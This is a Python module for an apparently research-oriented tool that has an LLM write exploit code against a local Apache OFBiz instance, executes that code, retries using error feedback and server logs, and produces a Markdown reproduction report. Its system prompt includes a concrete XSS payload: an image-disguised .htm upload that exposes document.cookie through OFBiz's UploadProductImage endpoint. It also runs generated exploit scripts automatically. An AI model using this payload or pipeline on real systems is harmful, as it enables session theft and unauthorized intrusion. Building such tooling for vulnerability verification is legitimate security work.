"""
Vulnerability Reproducer

Architecture:
  1. parse_vuln_context() — same analysis a human pentester does first:
       extract attack_type, endpoints, params, upload details
  2. build_exploit_skeleton() — pre-fills login + verification (always correct)
       LLM only fills Step 2: payload construction + exploit HTTP call
  3. Execute the stitched script, capture output
  4. Extract IMPACT EVIDENCE block and build Markdown report
"""

import re
import subprocess
from pathlib import Path

from core.llm.client import OllamaConnectionError
from core.reproduction.poc_generator import _patch_ssl_verify
from core.codebase.vuln_parser import parse_vuln_context, build_exploit_skeleton


def reproduce_vulnerability(client, vuln_description, code_context, analysis):
    """
    Generates, executes, and reports a vulnerability reproduction test using an iterative refinement loop.
    """
    print("[*] Parsing vulnerability context...")
    ctx = parse_vuln_context(vuln_description, analysis)
    print(f"  -> Attack type : {ctx['attack_type'].upper()}")
    print(f"  -> Entry points: {ctx['endpoints'][:3]}")
    print(f"  -> Parameters  : {ctx['query_params'][:5]}")
    print(f"  -> Is upload   : {ctx['is_upload']}")

    skeleton = build_exploit_skeleton(ctx)
    print("[*] Exploit skeleton pre-built. Asking LLM to fill Step 2 only...")

    system_prompt = """You are a penetration tester. You will be given a Python exploit skeleton
with Step 1 (login) and Step 3 (verify) already written correctly.
Your ONLY job is to write Step 2: the payload construction and exploit HTTP call.

ABSOLUTE RULES:
- Output ONLY a complete runnable ```python code block
- Keep Step 1 and Step 3 EXACTLY as given — do not modify them
- Step 2 builds the payload IN MEMORY using bytes literals — NEVER use open() on a file
- NEVER import Java packages (com.*, org.*, java.*)
- ONLY use: requests, urllib3, io, os, sys, re, struct, time

CORRECT way to build and upload a file payload:
  jpeg_header = bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10]) + b'A'*500
  html_tail   = b"\\n<script>document.write(document.cookie)</script>\\n"
  payload_bytes = jpeg_header + html_tail          # in-memory, no disk file
  files = {'file': ('xss.htm', payload_bytes, 'image/jpeg')}
  r = session.post(f"{BASE}/catalog/control/UploadProductImage",
                   files=files, params={'productId': product_id, 'up_load_file_type': 'original'})
"""

    base_prompt = f"""## Vulnerability
{vuln_description}

## Attack Context (pre-parsed)
- Attack type : {ctx['attack_type'].upper()}
- Summary     : {ctx['attack_summary']}
- Upload to   : {ctx['endpoints']}
- Filename    : {ctx.get('upload_filename', 'exploit.bin')}  <- this controls saved extension
- Content-Type: {ctx.get('upload_content_type', 'image/jpeg')}
- Parameters  : {ctx['query_params']}

## Relevant Source Code (understand HOW the server processes the upload/request)
{code_context[:5000]}

## Skeleton (Step 1 and Step 3 are DONE — only fill Step 2)
```python
{skeleton}
```

Fill in Step 2 of the skeleton above.
Replace the `# [LLM: insert ...]` comment with working Python code that:
1. Builds the payload bytes IN MEMORY
2. Sends the exploit HTTP request with correct parameters
3. Prints what was sent

Return the COMPLETE script (all steps) in a single ```python block.
"""

    max_retries = 3
    current_prompt = base_prompt
    verdict = "INCONCLUSIVE - Review output manually"
    verdict_icon = "YELLOW"
    
    for attempt in range(1, max_retries + 1):
        print(f"\n[*] Exploit Generation Attempt {attempt}/{max_retries}...")
        try:
            response = client.analyze_vulnerability(current_prompt, system_prompt=system_prompt)
        except OllamaConnectionError as e:
            return _error_report(vuln_description, f"Ollama error: {e}")

        # Extract code block
        clean = re.sub(r'<think>.*?</think>', '', response, flags=re.DOTALL).strip()
        if len(clean) < 50:
            clean = response

        code = None
        for pattern in [
            r'```python\s*\n(.*?)\n\s*```',
            r'```\s*\n(.*?)\n\s*```',
        ]:
            match = re.search(pattern, clean, re.DOTALL)
            if not match:
                match = re.search(pattern, response, re.DOTALL)
            if match:
                code = match.group(1).strip()
                break

        if not code:
            print("[!] LLM didn't return a code block. Using skeleton with stub Step 2.")
            code = skeleton.replace(
                "# [LLM: insert payload bytes construction + upload + any prerequisite steps here]",
                "print('[!] LLM failed to generate Step 2 — manual exploitation required')"
            )

        java_import = re.search(r'^\s*(?:from|import)\s+(?:com|org|java|javax)\.', code, re.MULTILINE)
        if java_import:
            print(f"[!] Warning: LLM generated Java import: `{java_import.group(0).strip()}`.")

        code = _patch_ssl_verify(code)

        test_file = f"repro_test_v{attempt}.py"
        with open(test_file, "w", encoding="utf-8") as f:
            f.write(code)
        print(f"[OK] Test saved as {test_file}")

        # Execute
        print(f"[*] Running reproduction test {attempt} against OFBiz...")
        try:
            result = subprocess.run(
                ["python3", "-u", test_file],
                capture_output=True, text=True, timeout=120
            )
            stdout = result.stdout
            stderr = result.stderr
            exit_code = result.returncode
        except subprocess.TimeoutExpired:
            stdout = ""
            stderr = "Test timed out after 120 seconds"
            exit_code = -1

        # Verdict check
        upper_out = stdout.upper()
        if "RESULT: VULNERABLE" in upper_out:
            print(f"[+] Attempt {attempt} SUCCESS! Target is VULNERABLE.")
            verdict = "VULNERABLE - Confirmed"
            verdict_icon = "RED"
            break
        elif "RESULT: NOT VULNERABLE" in upper_out:
            verdict = "NOT VULNERABLE"
            verdict_icon = "GREEN"
            
        if attempt < max_retries:
            print(f"[-] Attempt {attempt} FAILED. Refining payload based on execution feedback...")
            current_prompt += f"\n\n### Attempt {attempt} Failed.\n"
            current_prompt += f"The previous exploit script returned exit code {exit_code}.\n"
            if stdout:
                current_prompt += f"Exploit Output:\n```\n{stdout[-1000:]}\n```\n"
            if stderr:
                current_prompt += f"Exploit Error:\n```\n{stderr[-1000:]}\n```\n"
            
            # Check server logs for stack traces (e.g., 500 errors)
            try:
                log_file = Path('/kaggle/working/ofbiz.log')
                if log_file.exists():
                    log_content = log_file.read_text(encoding='utf-8', errors='replace')
                    # Grab the last 2000 chars of the server log to capture recent stack traces
                    server_err = log_content[-2000:]
                    if "Exception" in server_err or "Error" in server_err:
                        current_prompt += f"OFBiz Server Log snippet (shows potential 500 errors/stack traces from your payload):\n```\n{server_err}\n```\n"
            except Exception as e:
                pass
            
            current_prompt += "Please rewrite Step 2 of the script to fix these errors, adjust the payload, and try again. Output the full modified script."

    # Extract IMPACT EVIDENCE block from the final run
    impact_block = ""
    if stdout and "=== IMPACT EVIDENCE ===" in stdout:
        impact_start = stdout.index("=== IMPACT EVIDENCE ===")
        impact_raw = stdout[impact_start:]
        result_match = re.search(r'\nRESULT:', impact_raw)
        impact_block = impact_raw[:result_match.start()].strip() if result_match else impact_raw.strip()

    report = f"""# Vulnerability Reproduction Report

## Verdict: [{verdict_icon}] {verdict}

## Vulnerability
{vuln_description}

## Parsed Attack Context
| Field | Value |
|---|---|
| Attack Type | {ctx['attack_type'].upper()} |
| Summary | {ctx['attack_summary']} |
| Entry Endpoints | {', '.join(ctx['endpoints'][:3]) or 'N/A'} |
| Parameters | {', '.join(ctx['query_params'][:6]) or 'N/A'} |
| File Upload | {ctx['is_upload']} |

## Impact Evidence
{impact_block if impact_block else "_No structured impact block - see full output below._"}

## Reproduction Test Script (Final Iteration)
```python
{code}
```

## Full Execution Output
- **Exit Code:** {exit_code}

```
{stdout if stdout else "(empty)"}
```

### Errors
```
{stderr if stderr else "None"}
```

## Analysis Summary
{analysis[:1000]}{"..." if len(analysis) > 1000 else ""}
"""
    return report


def _error_report(vuln_description, error_msg):
    return f"""# Vulnerability Reproduction Report

## Verdict: [FAILED]

## Vulnerability
{vuln_description}

## Error
{error_msg}

## Recommendation
- Check that Ollama is running
- Check that OFBiz is accessible at https://localhost:8443
- Re-run Phase 1 analysis if needed
"""
